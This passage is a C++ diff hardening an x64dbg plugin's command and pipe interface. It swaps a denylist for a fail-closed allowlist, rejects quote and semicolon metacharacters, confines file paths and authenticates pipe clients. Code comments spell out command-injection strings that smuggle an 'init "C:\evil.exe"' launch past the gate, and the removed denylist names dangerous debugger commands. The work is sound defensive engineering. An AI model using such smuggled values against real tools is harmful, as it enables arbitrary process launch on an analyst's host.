     return BuildJsonResponse(true, "\"message\":\"Hardware breakpoint deleted\"");
 }
 
@@ -2075,16 +2526,16 @@ std::string HandleToggleHardwareBreakpoint(const std::string& request) {
 
     char cmd[256];
     if (enable) {
-        snprintf(cmd, sizeof(cmd), "bphe %llx", address);
+        snprintf(cmd, sizeof(cmd), "bphe %llx", (unsigned long long)address);
     } else {
-        snprintf(cmd, sizeof(cmd), "bphd %llx", address);
+        snprintf(cmd, sizeof(cmd), "bphd %llx", (unsigned long long)address);
     }
 
     if (!DbgCmdExec(cmd)) {
         return BuildJsonResponse(false, "\"error\":\"Failed to toggle hardware breakpoint\"");
     }
 
-    LogInfo("Hardware breakpoint at 0x%llx %s", address, enable ? "enabled" : "disabled");
+    LogInfo("Hardware breakpoint at 0x%llx %s", (unsigned long long)address, enable ? "enabled" : "disabled");
 
     std::stringstream data;
     data << "\"address\":\"" << std::hex << address << std::dec << "\","
@@ -2115,16 +2566,16 @@ std::string HandleToggleMemoryBreakpoint(const std::string& request) {
 
     char cmd[256];
     if (enable) {
-        snprintf(cmd, sizeof(cmd), "bpme %llx", address);
+        snprintf(cmd, sizeof(cmd), "bpme %llx", (unsigned long long)address);
     } else {
-        snprintf(cmd, sizeof(cmd), "bpmd %llx", address);
+        snprintf(cmd, sizeof(cmd), "bpmd %llx", (unsigned long long)address);
     }
 
     if (!DbgCmdExec(cmd)) {
         return BuildJsonResponse(false, "\"error\":\"Failed to toggle memory breakpoint\"");
     }
 
-    LogInfo("Memory breakpoint at 0x%llx %s", address, enable ? "enabled" : "disabled");
+    LogInfo("Memory breakpoint at 0x%llx %s", (unsigned long long)address, enable ? "enabled" : "disabled");
 
     std::stringstream data;
     data << "\"address\":\"" << std::hex << address << std::dec << "\","
@@ -2222,13 +2673,33 @@ std::string HandleStartTrace(const std::string& request) {
         return BuildJsonResponse(false, "\"error\":\"Not debugging\"");
     }
 
+    std::string logFile = ExtractStringField(request, "log_file");
+
+    // F-27: resolve the caller-supplied log path BEFORE touching any state, so
+    // a rejected path leaves a previously running trace exactly as it was
+    // instead of half-reconfigured. See ResolveConfinedOutputPath.
+    std::string resolvedLogPath;
+    if (!logFile.empty()) {
+        std::string pathError;
+        if (!ResolveConfinedOutputPath(logFile, TRACE_LOG_EXTENSIONS, resolvedLogPath, pathError)) {
+            LogError("Rejected trace log path '%s': %s", logFile.c_str(), pathError.c_str());
+            std::stringstream err;
+            err << "\"error\":\"" << JsonEscape(pathError) << "\"";
+            return BuildJsonResponse(false, err.str());
+        }
+    }
+
     InitTraceLocks();
     EnterCriticalSection(&g_traceLock);
 
     // Parse options
     g_traceState.traceInto = ExtractIntField(request, "trace_into", 1) != 0;
-    g_traceState.maxEntries = ExtractIntField(request, "max_entries", 100000);
-    std::string logFile = ExtractStringField(request, "log_file");
+    int requestedMax = ExtractIntField(request, "max_entries", 100000);
+    // maxEntries is unsigned, so a negative request used to become an enormous
+    // positive value and survive only because the cap below happened to catch
+    // it. Clamp at the signed boundary instead of relying on wraparound.
+    if (requestedMax < 1) requestedMax = 1;
+    g_traceState.maxEntries = (uint64_t)requestedMax;
 
     // Cap max entries
     if (g_traceState.maxEntries > 1000000) g_traceState.maxEntries = 1000000;
@@ -2238,13 +2709,26 @@ std::string HandleStartTrace(const std::string& request) {
     g_traceState.startTime = GetTickCount64();
     g_traceState.enabled = true;
 
-    // Open log file if specified
-    if (!logFile.empty()) {
-        g_traceState.logFile = logFile;
-        g_traceState.logFileHandle = fopen(logFile.c_str(), "w");
+    // Handle leak: START_TRACE may legitimately be called twice in a row (the
+    // caller re-arming a trace), and the second call used to overwrite a live
+    // logFileHandle without closing it. That leaks a FILE* and, worse, leaves
+    // the previous log file open for writing for the lifetime of x64dbg, so it
+    // can never be moved or deleted. Close whatever is open first.
+    if (g_traceState.logFileHandle) {
+        fclose(g_traceState.logFileHandle);
+        g_traceState.logFileHandle = nullptr;
+    }
+    g_traceState.logFile.clear();
+
+    // Open log file if specified (path already confined above)
+    if (!resolvedLogPath.empty()) {
+        g_traceState.logFile = resolvedLogPath;
+        g_traceState.logFileHandle = fopen(resolvedLogPath.c_str(), "w");
         if (g_traceState.logFileHandle) {
             fprintf(g_traceState.logFileHandle, "# Trace started at %llu\n", g_traceState.startTime);
             fprintf(g_traceState.logFileHandle, "# Format: timestamp,address,module,instruction,thread_id\n");
+        } else {
+            LogError("Could not open confined trace log '%s'", resolvedLogPath.c_str());
         }
     }
 
@@ -2256,6 +2740,11 @@ std::string HandleStartTrace(const std::string& request) {
     data << "\"message\":\"Trace started\","
          << "\"trace_into\":" << (g_traceState.traceInto ? "true" : "false") << ","
          << "\"max_entries\":" << g_traceState.maxEntries;
+    // Report the path actually used, not the one requested -- the caller asked
+    // for a name and F-27 confinement decided where it landed.
+    if (!resolvedLogPath.empty()) {
+        data << ",\"log_file\":\"" << JsonEscape(resolvedLogPath) << "\"";
+    }
 
     return BuildJsonResponse(true, data.str());
 }
@@ -2297,6 +2786,13 @@ std::string HandleGetTraceData(const std::string& request) {
 
     int offset = ExtractIntField(request, "offset", 0);
     int limit = ExtractIntField(request, "limit", 1000);
+
+    // A negative offset is fed to `for (size_t i = offset; ...)` below, where
+    // the sign-conversion turns e.g. -1 into SIZE_MAX. That happens to be safe
+    // today only because the loop condition `i < entries.size()` then fails
+    // immediately -- it is correct by accident, and it stops being correct the
+    // moment anyone indexes with `offset` before comparing. Clamp explicitly.
+    if (offset < 0) offset = 0;
 
     // Cap limit
     if (limit > 10000) limit = 10000;
@@ -2358,7 +2854,7 @@ std::string HandleSetApiBreakpoint(const std::string& request) {
 
     // Set conditional breakpoint with logging
     char cmd[512];
-    snprintf(cmd, sizeof(cmd), "bp %llx", address);
+    snprintf(cmd, sizeof(cmd), "bp %llx", (unsigned long long)address);
     if (!DbgCmdExec(cmd)) {
         return BuildJsonResponse(false, "\"error\":\"Failed to set breakpoint\"");
     }
@@ -2373,7 +2869,7 @@ std::string HandleSetApiBreakpoint(const std::string& request) {
     }
     LeaveCriticalSection(&g_apiLogLock);
 
-    LogInfo("API breakpoint set: %s at 0x%llx", apiName.c_str(), address);
+    LogInfo("API breakpoint set: %s at 0x%llx", apiName.c_str(), (unsigned long long)address);
 
     std::stringstream data;
     data << "\"api_name\":\"" << JsonEscape(apiName) << "\","
@@ -2389,6 +2885,10 @@ std::string HandleGetApiLog(const std::string& request) {
 
     int offset = ExtractIntField(request, "offset", 0);
     int limit = ExtractIntField(request, "limit", 100);
+
+    // Clamp before the size_t conversion in the loop below -- see the identical
+    // note in HandleGetTraceData.
+    if (offset < 0) offset = 0;
 
     if (limit > 1000) limit = 1000;
     if (limit < 1) limit = 1;
@@ -2787,7 +3287,7 @@ std::string HandleFindReferences(const std::string& request) {
 
     // Use x64dbg's reference search
     char cmd[256];
-    snprintf(cmd, sizeof(cmd), "findallmem %llx", targetAddr);
+    snprintf(cmd, sizeof(cmd), "findallmem %llx", (unsigned long long)targetAddr);
 
     // Get references using DbgGetRefList
     // Note: This is a simplified implementation - full implementation would use GUIREF APIs
@@ -3091,7 +3591,7 @@ std::string HandlePatchDbgCheck(const std::string& request) {
         return BuildJsonResponse(false, "\"error\":\"Failed to write patch\"");
     }
 
-    LogInfo("Patched debug check at 0x%llx with %s", address, patchType.c_str());
+    LogInfo("Patched debug check at 0x%llx with %s", (unsigned long long)address, patchType.c_str());
 
     std::stringstream data;
     data << "\"address\":\"" << std::hex << address << std::dec << "\","
@@ -3176,6 +3676,10 @@ std::string HandleGetCoverageData(const std::string& request) {
     int offset = ExtractIntField(request, "offset", 0);
     int limit = ExtractIntField(request, "limit", 1000);
     std::string sortBy = ExtractStringField(request, "sort");
+
+    // Clamp before the size_t conversion in the loop below -- see the identical
+    // note in HandleGetTraceData.
+    if (offset < 0) offset = 0;
 
     if (limit > 10000) limit = 10000;
     if (limit < 1) limit = 1;
@@ -3286,10 +3790,29 @@ std::string HandleExportCoverage(const std::string& request) {
 
     if (format.empty()) format = "csv";
 
+    // F-27: `file` arrives straight from the request. Confine it to the plugin
+    // output directory before anything opens it -- see ResolveConfinedOutputPath
+    // for why prefix-after-canonicalisation is the control that matters here.
+    std::string resolvedPath;
+    std::string pathError;
+    if (!ResolveConfinedOutputPath(filePath, COVERAGE_OUTPUT_EXTENSIONS, resolvedPath, pathError)) {
+        LogError("Rejected coverage export path '%s': %s", filePath.c_str(), pathError.c_str());
+        std::stringstream err;
+        err << "\"error\":\"" << JsonEscape(pathError) << "\"";
+        return BuildJsonResponse(false, err.str());
+    }
+
+    // Reject an unknown format before creating the file. The old code opened
+    // (and therefore truncated) the target first and only then discovered the
+    // format was invalid, so a bad request still destroyed the file's contents.
+    if (format != "csv" && format != "json" && format != "drcov") {
+        return BuildJsonResponse(false, "\"error\":\"Invalid format (use csv, json, or drcov)\"");
+    }
+
     InitCoverageLock();
     EnterCriticalSection(&g_coverageLock);
 
-    FILE* file = fopen(filePath.c_str(), "w");
+    FILE* file = fopen(resolvedPath.c_str(), "w");
     if (!file) {
         LeaveCriticalSection(&g_coverageLock);
         return BuildJsonResponse(false, "\"error\":\"Failed to open file for writing\"");
@@ -3333,7 +3856,8 @@ std::string HandleExportCoverage(const std::string& request) {
             mainSize = 0x100000;  // Default estimate
         }
         fprintf(file, " 0, 0x%llx, 0x%llx, 0x%llx, %s\n",
-            mainBase, mainBase + mainSize, mainBase, mainModule);
+            (unsigned long long)mainBase, (unsigned long long)(mainBase + mainSize),
+            (unsigned long long)mainBase, mainModule);
 
         fprintf(file, "BB Table: %zu bbs\n", entryCount);
         for (const auto& pair : g_coverageState.entries) {
@@ -3350,11 +3874,11 @@ std::string HandleExportCoverage(const std::string& request) {
     fclose(file);
     LeaveCriticalSection(&g_coverageLock);
 
-    LogInfo("Exported %zu coverage entries to %s", entryCount, filePath.c_str());
+    LogInfo("Exported %zu coverage entries to %s", entryCount, resolvedPath.c_str());
 
     std::stringstream data;
     data << "\"message\":\"Coverage exported\","
-         << "\"file\":\"" << JsonEscape(filePath) << "\","
+         << "\"file\":\"" << JsonEscape(resolvedPath) << "\","
          << "\"format\":\"" << format << "\","
          << "\"entries\":" << entryCount;
 
@@ -3597,36 +4121,218 @@ void OnSystemBreakpoint(CBTYPE cbType, PLUG_CB_SYSTEMBREAKPOINT* info) {
     );
 }
 
-// Defense-in-depth: server-side allowlist for EXECUTE_COMMAND.
-// Blocks commands that could load external code, write arbitrary files,
-// or compromise the debugger/analyst host. The Python layer has its own
-// allowlist; this is a safety net in case it is bypassed.
-static const char* BLOCKED_COMMAND_PREFIXES[] = {
-    "scriptdll", "scriptload", "scriptrun",
-    "loadlib", "freelib",
-    "savedata", "savefile",
-    "quit", "stop", "exit",
-    "detach", "attach", "init",
-    "exec", "execute",
-    "createthread",
-    "tracesetcommand", "tracesetlog", "tracesetlogfile",
+// ---------------------------------------------------------------------------
+// EXECUTE_COMMAND gate -- AUTHORITATIVE. Allowlist, fails closed.
+//
+// What this used to be, and why it was replaced (audit findings F-4 / F-9):
+//
+// F-4: this was a ~19-entry DENYLIST (BLOCKED_COMMAND_PREFIXES) that was
+// byte-identical to _BLOCKED_COMMANDS in bridge.py, matched the same way
+// (exact compare against the lowercased first token). The comment here claimed
+// it was "a safety net in case the Python layer is bypassed", but a copy of a
+// list is not a second control: every command absent from the Python list was
+// absent from this one too. One control, described as two.
+//
+// F-9: worse, a denylist cannot work against this command language at all.
+// x64dbg registers MULTIPLE ALIASES per command handler and the list named
+// exactly one spelling of each, so any other spelling walked straight through.
+// The command that STARTS a debuggee is `init` -- HandleLoadBinary below
+// builds `init "<path>"` for exactly that purpose -- so one missed alias turns
+// EXECUTE_COMMAND into an arbitrary-process-launch primitive on the analyst's
+// own host. For a malware-analysis tool that is a cardinal-rule violation, and
+// it is not fixable by adding more entries: the alias set is defined by
+// x64dbg, not by us, and grows with every x64dbg release.
+//
+// So the gate is INVERTED. Only the commands below are executable; anything
+// unrecognised is refused, including aliases nobody here has heard of. An
+// unknown alias of a dangerous command now fails closed instead of open.
+//
+// Relationship to the Python layer: bridge.py keeps a small denylist, but it
+// is NOT this control. It is a cheap early reject that produces a clear local
+// error before a request crosses the pipe. It denies by name; this allows by
+// name. They are deliberately different in direction and in contents, and when
+// they disagree THIS list decides, because this is the last thing standing
+// between a request and DbgCmdExec. Never widen this list because the Python
+// list happens to permit something.
+//
+// Contents are derived from what this project actually issues on the command
+// endpoint: the commands built by src/engines/dynamic/x64dbg/bridge.py, the
+// tool-level allowlist in src/tools/dynamic_tools.py (allowed_command_prefixes),
+// and the examples in x64dbg_execute_command's docstring (dis.prev, findall,
+// log). Keep it tight -- every entry added here is granted to every MCP client
+// and to anything that can reach the local HTTP port. In particular the trace
+// CONFIGURATION commands (tracesetcommand / tracesetlog / tracesetlogfile) are
+// intentionally absent: their arguments are themselves commands and file
+// paths, so allowing them would re-open the hole this table closes. The trace
+// EXECUTION commands (ticnd/tocnd/tibt/tobt) are present because the bridge's
+// conditional-tracing methods issue them and they only resume the debuggee,
+// which the dedicated run/step tools already permit.
+// ---------------------------------------------------------------------------
+static const char* ALLOWED_COMMANDS[] = {
+    // Disassembly navigation and instruction queries (read-only)
+    "dis", "disasm", "dis.prev", "dis.next", "dis.iscall", "dis.isbranch",
+    "graph", "graphit",
+    "dump", "sdump",
+
+    // Search: memory, patterns, assembly, GUIDs (read-only)
+    "find", "findall", "findmem", "findallmem",
+    "findasm", "findguid",
+
+    // Cross-references and module call discovery (read-only)
+    "ref", "refstr", "refsearch", "refinfo", "reffindrange",
+    "modcallfind",
+
+    // Static analysis passes over the loaded module (read-only)
+    "cfanalyze", "analxrefs", "analrecur", "analadv", "analyse",
+    "exhandlers", "exinfo",
+
+    // Expression evaluation and logging (read-only / output-only)
+    "eval", "log", "msg",
+
+    // Annotations: labels, comments, bookmarks. These mutate the analysis
+    // database only -- never the debuggee and never the host filesystem.
+    "lbl", "lblset", "lbldel", "lbllist",
+    "cmt", "cmtset", "cmtdel", "cmtlist",
+    "bm", "bmset", "bmdel", "bmlist",
+
+    // Breakpoint listing / DLL breakpoints. Setting execution breakpoints goes
+    // through the dedicated SET_BREAKPOINT handlers, not through here.
+    "bplist", "bphitcount",
+    "bpdll", "bcdll", "bpedll", "bpddll",
+
+    // Watch expressions (bridge: add_watch / delete_watch / set_watch_*)
+    "addwatch", "delwatch", "setwatchdog",
+    "setwatchexpression", "setwatchname",
+
+    // Type system (bridge: add_struct / add_type / visit_type / ...)
+    "addstruct", "addunion", "addmember", "addtype",
+    "visittype", "sizeoftype", "removetype",
+    "enumtypes", "cleartypes", "loadtypes", "parsetypes",
+
+    // Debugger variables (bridge: set_variable / delete_variable / list_variables)
+    "var", "vardel", "varlist",
+
+    // Debuggee privilege toggles (bridge: enable_privilege / disable_privilege).
+    // These act on the DEBUGGEE's token, not on the debugger, and are exposed
+    // by dedicated tools already.
+    "enableprivilege", "disableprivilege",
+
+    // Execution control that the bridge issues on this endpoint: run-to-user
+    // code, single-instruction undo, and conditional/record tracing.
+    "rtu", "instrundo",
+    "ticnd", "tocnd", "tibt", "tobt",
+    "tracesetcondition",
+
     nullptr  // sentinel
 };
 
-static bool IsCommandBlocked(const std::string& command) {
-    // Extract first word, lowercased
+// ---------------------------------------------------------------------------
+// Finding F-16 (plugin side) -- the gate matched ONE token, DbgCmdExec runs
+// MANY commands.
+//
+// x64dbg's command dispatcher treats ';' as a command separator, so a single
+// string handed to DbgCmdExec is a command LIST, not a command. The gate used
+// to lowercase the first word of the whole string, look that up, and let the
+// entire string through on the strength of it. So:
+//
+//     "bplist; init \"C:\\\\evil.exe\""
+//
+// passed the allowlist on `bplist` and then executed `init` -- precisely the
+// arbitrary-process-launch primitive that inverting this gate (F-9) existed to
+// prevent, reachable through the gate rather than around it.
+//
+// The gate is therefore applied to EVERY ';'-separated segment. A command list
+// is admitted only if every one of its members is independently admissible.
+//
+// Two deliberate over-rejections, both fail-closed:
+//   * a trailing or doubled ';' yields an empty segment, which is refused
+//     rather than skipped -- "allowed; " is not worth a special case, and
+//     skipping empties is the kind of leniency that grows into a bypass;
+//   * a ';' inside a quoted argument (log "a;b") is still treated as a
+//     separator, because this code does not model x64dbg's quoting rules and
+//     guessing them wrong in the permissive direction is how gates fail.
+// ---------------------------------------------------------------------------
+
+// Match ONE already-split command segment against ALLOWED_COMMANDS.
+// Every path that is not an exact table hit returns false.
+static bool IsCommandSegmentAllowed(const std::string& segment) {
+    // Skip leading whitespace so "log x; bplist" matches on "bplist", not " bplist".
+    size_t begin = 0;
+    while (begin < segment.size() && (segment[begin] == ' ' || segment[begin] == '\t')) {
+        begin++;
+    }
+
+    // Fail closed: an empty segment is not "no command", it is an unparsed one.
+    if (begin >= segment.size()) {
+        return false;
+    }
+
+    // A leading '$' makes x64dbg parse the line as an expression/assignment
+    // instead of a registered command, so it would never match a table entry --
+    // but it must be refused explicitly rather than left to fall off the end of
+    // the table, because the whole point of this function is that the reason a
+    // string is refused is legible.
+    if (segment[begin] == '$') {
+        return false;
+    }
+
+    // Extract first word, lowercased. The terminator set matches x64dbg's
+    // argument syntax so that both "findall 0, E8" and the function-call form
+    // "dis.prev(rip, 5)" reduce to their command name.
     std::string firstWord;
-    for (size_t i = 0; i < command.size(); i++) {
-        char c = command[i];
+    for (size_t i = begin; i < segment.size(); i++) {
+        char c = segment[i];
         if (c == ' ' || c == '\t' || c == '(' || c == ',') break;
         firstWord += (char)tolower((unsigned char)c);
     }
 
-    for (int i = 0; BLOCKED_COMMAND_PREFIXES[i] != nullptr; i++) {
-        if (firstWord == BLOCKED_COMMAND_PREFIXES[i]) {
+    // Fail closed: an empty token is not "no command", it is an unparsed one.
+    if (firstWord.empty()) {
+        return false;
+    }
+
+    for (int i = 0; ALLOWED_COMMANDS[i] != nullptr; i++) {
+        if (firstWord == ALLOWED_COMMANDS[i]) {
             return true;
         }
     }
+    return false;
+}
+
+// Returns true only if EVERY ';'-separated segment of the command is on
+// ALLOWED_COMMANDS. Every other input -- unknown command, unknown alias, empty
+// string, anything carrying an embedded line break -- is refused.
+static bool IsCommandAllowed(const std::string& command) {
+    // x64dbg's script engine is line-oriented, so a CR/LF is a command
+    // separator this function does not split on, and an embedded NUL truncates
+    // the string differently for strlen-based consumers than for std::string.
+    // None of the three is ever legitimate here -- reject outright rather than
+    // trying to parse what the rest of the line would mean.
+    for (size_t i = 0; i < command.size(); i++) {
+        unsigned char c = (unsigned char)command[i];
+        if (c == '\n' || c == '\r' || c == '\0') {
+            return false;
+        }
+    }
+
+    // F-16: check every ';'-separated segment, not just the first.
+    size_t start = 0;
+    while (start <= command.size()) {
+        size_t end = command.find(';', start);
+        std::string segment = (end == std::string::npos)
+                                  ? command.substr(start)
+                                  : command.substr(start, end - start);
+        if (!IsCommandSegmentAllowed(segment)) {
+            return false;
+        }
+        if (end == std::string::npos) {
+            return true;
+        }
+        start = end + 1;
+    }
+
+    // Default branch. Reached only if the loop is ever restructured such that
+    // it can fall out; a gate's fall-through must be a rejection.
     return false;
 }
 
@@ -3641,10 +4347,15 @@ std::string HandleExecuteCommand(const std::string& request) {
         return BuildJsonResponse(false, "\"error\":\"Not debugging - load a binary first\"");
     }
 
-    // Defense-in-depth: reject dangerous commands at the plugin level
-    if (IsCommandBlocked(command)) {
-        LogInfo("Blocked dangerous command: %s", command.c_str());
-        return BuildJsonResponse(false, "\"error\":\"Command blocked by security policy\"");
+    // Authoritative gate (findings F-4 / F-9): allowlist, fails closed.
+    // Refuse with a JSON error rather than throwing or aborting -- the pipe
+    // server expects a well-formed response for every request, and a refused
+    // command is a normal outcome, not a fault.
+    if (!IsCommandAllowed(command)) {
+        LogInfo("Blocked command (not on allowlist): %s", command.c_str());
+        return BuildJsonResponse(false,
+            "\"error\":\"Command blocked by security policy: not on the allowlist "
+            "of permitted analysis commands\"");
     }
 
     LogInfo("Executing command: %s", command.c_str());
@@ -3661,6 +4372,37 @@ std::string HandleExecuteCommand(const std::string& request) {
     }
 }
 
+// AUDIT (command-string injection into DbgCmdExec): HandleLoadBinary builds
+//
+//     init "<path>", "<arguments>", "<working_directory>"
+//
+// by string concatenation, with no escaping of any of the three fields. x64dbg
+// has no escape syntax inside a quoted command argument, so a field containing
+// a double quote CLOSES the quote and everything after it is reparsed as
+// command syntax -- and ';' then starts a whole new command. A `path` of
+//
+//     C:\a.exe";bplist;init "C:\evil.exe
+//
+// therefore executes commands the caller never named, straight past the
+// EXECUTE_COMMAND allowlist, because this handler is not the command endpoint.
+//
+// There is no correct way to escape these for x64dbg, so the only sound answer
+// is to refuse the characters that make reparsing possible: the quote itself,
+// a backslash immediately before a quote (which some parsers treat as an
+// escaped quote and which is never meaningful at the end of a Windows path),
+// the ',' argument separator, and any control character (CR/LF terminate the
+// command line outright). Legitimate Windows paths and working directories
+// never contain any of them.
+static bool ContainsCommandMetacharacters(const std::string& value) {
+    for (size_t i = 0; i < value.size(); i++) {
+        unsigned char c = (unsigned char)value[i];
+        if (c < 0x20 || c == 0x7F) return true;   // controls, incl. CR/LF/NUL/DEL
+        if (c == '"' || c == ',' || c == ';') return true;
+        if (c == '\\' && i + 1 < value.size() && value[i + 1] == '"') return true;
+    }
+    return false;
+}
+
 // Handler: LOAD_BINARY - Load binary into debugger
 std::string HandleLoadBinary(const std::string& request) {
     std::string path = ExtractStringField(request, "path");
@@ -3669,6 +4411,17 @@ std::string HandleLoadBinary(const std::string& request) {
 
     if (path.empty()) {
         return BuildJsonResponse(false, "\"error\":\"Missing path\"");
+    }
+
+    // See ContainsCommandMetacharacters above: all three fields are interpolated
+    // into a quoted x64dbg command string that has no escape syntax.
+    if (ContainsCommandMetacharacters(path) ||
+        ContainsCommandMetacharacters(args) ||
+        ContainsCommandMetacharacters(workingDir)) {
+        LogError("Rejected LOAD_BINARY: field contains x64dbg command metacharacters");
+        return BuildJsonResponse(false,
+            "\"error\":\"path, arguments and working_directory may not contain "
+            "quotes, commas, semicolons or control characters\"");
     }
 
     // Build command
@@ -3688,31 +4441,145 @@ std::string HandleLoadBinary(const std::string& request) {
     return BuildJsonResponse(true, "\"message\":\"Binary loaded\"");
 }
 
+// Forward declaration: the pipe DACL is built with the same helper as the auth
+// token file's, which is defined further down next to pluginSetup (F-15/F-17).
+static bool BuildCurrentUserOnlySecurity(SECURITY_ATTRIBUTES& sa, PSECURITY_DESCRIPTOR& outSd);
+
+// Close the pipe instance. PipeServerThread is the ONLY caller -- see the
+// ownership comment on pluginStop -- and it takes g_pipeHandleLock so that a
+// concurrent CancelIoEx from pluginStop can never be issued on a handle that
+// has already been closed (or, far worse, on a recycled handle value that by
+// then names something else entirely).
+static void ClosePipeServerHandle() {
+    if (g_pipeHandleLockInit) EnterCriticalSection(&g_pipeHandleLock);
+    if (g_pipeServer != INVALID_HANDLE_VALUE) {
+        CloseHandle(g_pipeServer);
+        g_pipeServer = INVALID_HANDLE_VALUE;
+    }
+    if (g_pipeHandleLockInit) LeaveCriticalSection(&g_pipeHandleLock);
+}
+
+// ---------------------------------------------------------------------------
+// Finding F-17 -- the named pipe had NO authentication and the wrong DACL.
+//
+// The pipe is the plugin's real control surface: every request that reaches the
+// switch below can read and WRITE debuggee memory, run x64dbg commands and load
+// binaries. The bearer token that supposedly protects all that is checked in
+// obsidian_server.exe -- on the HTTP side -- and never here. So anything that
+// could open \\.\pipe\x64dbg_mcp was already past authentication.
+//
+// Who could open it? CreateNamedPipeA was called with nullptr security
+// attributes, i.e. the process default DACL, which grants access to any process
+// running as the same user. On a malware-analysis workstation the debuggee is
+// normally started BY x64dbg AS THE SAME USER. The sample under analysis could
+// therefore connect to this pipe and drive WRITE_MEMORY / EXECUTE_COMMAND /
+// LOAD_BINARY against its own debugger with no token at all -- the trust
+// boundary ran the wrong way round.
+//
+// Three changes, all of them necessary:
+//   1. PIPE_REJECT_REMOTE_CLIENTS -- named pipes are reachable over SMB, so
+//      without this the surface is not even local.
+//   2. An explicit DACL naming only the current user, replacing the default.
+//      This is defence in depth, not the fix: it does not exclude the debuggee,
+//      which runs as that same user. Item 3 is the fix.
+//   3. Peer authentication on every connection: GetNamedPipeClientProcessId,
+//      compared against the PID of the obsidian_server.exe this plugin spawned.
+//      Anything else is disconnected before a single byte is read.
+//
+// On PID reuse: the comparison is sound because the plugin holds an open handle
+// to that process (g_serverProcess) for its whole lifetime, and Windows cannot
+// recycle a PID while a handle to the process is open. A zero g_serverProcessId
+// means no server has been spawned yet, which is a reject, not a bypass.
+// ---------------------------------------------------------------------------
+static bool IsPipeClientAuthorised(HANDLE pipe) {
+    ULONG clientPid = 0;
+    if (!GetNamedPipeClientProcessId(pipe, &clientPid)) {
+        LogError("Rejecting pipe client: GetNamedPipeClientProcessId failed (%d)", GetLastError());
+        return false;
+    }
+
+    DWORD expectedPid = g_serverProcessId.load();
+    if (expectedPid == 0) {
+        LogError("Rejecting pipe client PID %lu: no Obsidian server has been spawned yet",
+                 (unsigned long)clientPid);
+        return false;
+    }
+
+    if ((DWORD)clientPid != expectedPid) {
+        LogError("Rejecting pipe client PID %lu: expected the spawned Obsidian server (PID %lu)",
+                 (unsigned long)clientPid, (unsigned long)expectedPid);
+        return false;
+    }
+
+    return true;
+}
+
 // Named Pipe server thread (handles requests from HTTP server process)
 static DWORD WINAPI PipeServerThread(LPVOID lpParam) {
     LogInfo("Named Pipe server thread starting...");
 
+    // Signal g_pipeReadyEvent exactly once, on the first pipe instance.
+    // pluginSetup closes that event as soon as its 5-second wait returns, so
+    // touching it on a LATER iteration would be a use-after-close -- and later
+    // iterations are now routine, because F-17 recreates the instance every
+    // time an unauthorised peer is turned away.
+    bool signalledReady = false;
+
     while (g_running) {
+        // F-17: explicit user-only DACL instead of the process default.
+        SECURITY_ATTRIBUTES pipeSa;
+        PSECURITY_DESCRIPTOR pipeSd = nullptr;
+        bool havePipeSecurity = BuildCurrentUserOnlySecurity(pipeSa, pipeSd);
+        if (!havePipeSecurity) {
+            LogError("Could not build restrictive DACL for the pipe: %d "
+                     "(falling back to default security; peer PID check still applies)",
+                     GetLastError());
+        }
+
         // Create named pipe instance with FILE_FLAG_OVERLAPPED for async operations
-        g_pipeServer = CreateNamedPipeA(
+        HANDLE pipe = CreateNamedPipeA(
             Protocol::PIPE_NAME,
             PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
-            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
+            // F-17: PIPE_REJECT_REMOTE_CLIENTS -- without it this pipe is
+            // openable across SMB by anything that can authenticate to the box.
+            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT | PIPE_REJECT_REMOTE_CLIENTS,
             1,  // Max instances
             Protocol::MAX_MESSAGE_SIZE,
             Protocol::MAX_MESSAGE_SIZE,
             0,
-            nullptr
+            havePipeSecurity ? &pipeSa : nullptr
         );
 
-        if (g_pipeServer == INVALID_HANDLE_VALUE) {
+        // The descriptor is copied into the object at creation time.
+        if (pipeSd) {
+            LocalFree(pipeSd);
+            pipeSd = nullptr;
+        }
+
+        if (pipe == INVALID_HANDLE_VALUE) {
             LogError("Failed to create named pipe: %d", GetLastError());
             return 1;
         }
+        // Publish the handle UNDER THE LOCK (CWE-362). pluginStop reads
+        // g_pipeServer while holding g_pipeHandleLock and calls CancelIoEx /
+        // DisconnectNamedPipe on it; ClosePipeServerHandle clears it under the
+        // same lock. This assignment was the one access that did neither, so
+        // the invariant pluginStop's comment asserts -- that the handle cannot
+        // change under it mid-call -- did not actually hold, and g_pipeServer
+        // is a plain static a compiler is free to cache.
+        //
+        // Practical effect of the old race was bounded (pluginStop could see
+        // INVALID_HANDLE_VALUE, skip the cancel, and rely on g_running plus
+        // g_shutdownEvent to unwind the thread) but it was still a data race,
+        // and "bounded today" is not a property that survives edits.
+        if (g_pipeHandleLockInit) EnterCriticalSection(&g_pipeHandleLock);
+        g_pipeServer = pipe;
+        if (g_pipeHandleLockInit) LeaveCriticalSection(&g_pipeHandleLock);
 
-        // Signal that pipe is ready for server to connect
-        if (g_pipeReadyEvent) {
+        // Signal that pipe is ready for server to connect (first instance only)
+        if (!signalledReady && g_pipeReadyEvent) {
             SetEvent(g_pipeReadyEvent);
+            signalledReady = true;
         }
 
         LogInfo("Waiting for HTTP server to connect...");
@@ -3720,6 +4587,16 @@ static DWORD WINAPI PipeServerThread(LPVOID lpParam) {
         // Use overlapped I/O for interruptible ConnectNamedPipe
         OVERLAPPED overlapped = {};
         overlapped.hEvent = CreateEventA(nullptr, TRUE, FALSE, nullptr);
+        if (!overlapped.hEvent) {
+            // AUDIT: this CreateEventA was unchecked. A NULL hEvent makes the
+            // WaitForMultipleObjects below return WAIT_FAILED, and the old
+            // else-branch read any non-WAIT_OBJECT_0 result as "shutdown
+            // requested" -- so an event-creation failure silently tore the
+            // bridge down and reported it as a clean shutdown.
+            LogError("Failed to create pipe connect event: %d", GetLastError());
+            ClosePipeServerHandle();
+            return 1;
+        }
 
         BOOL connected = ConnectNamedPipe(g_pipeServer, &overlapped);
         DWORD error = GetLastError();
@@ -3732,26 +4609,45 @@ static DWORD WINAPI PipeServerThread(LPVOID lpParam) {
             if (waitResult == WAIT_OBJECT_0) {
                 // Connection succeeded
                 LogInfo("HTTP server connected to pipe");
-            } else {
+            } else if (waitResult == WAIT_OBJECT_0 + 1) {
                 // Shutdown event signaled
                 CancelIo(g_pipeServer);
                 CloseHandle(overlapped.hEvent);
-                CloseHandle(g_pipeServer);
-                g_pipeServer = INVALID_HANDLE_VALUE;
+                ClosePipeServerHandle();
                 LogInfo("Pipe server thread shutting down (no connection)");
                 return 0;
+            } else {
+                // WAIT_FAILED / WAIT_ABANDONED. Distinguished from shutdown so
+                // the log says what actually happened (see the CreateEventA
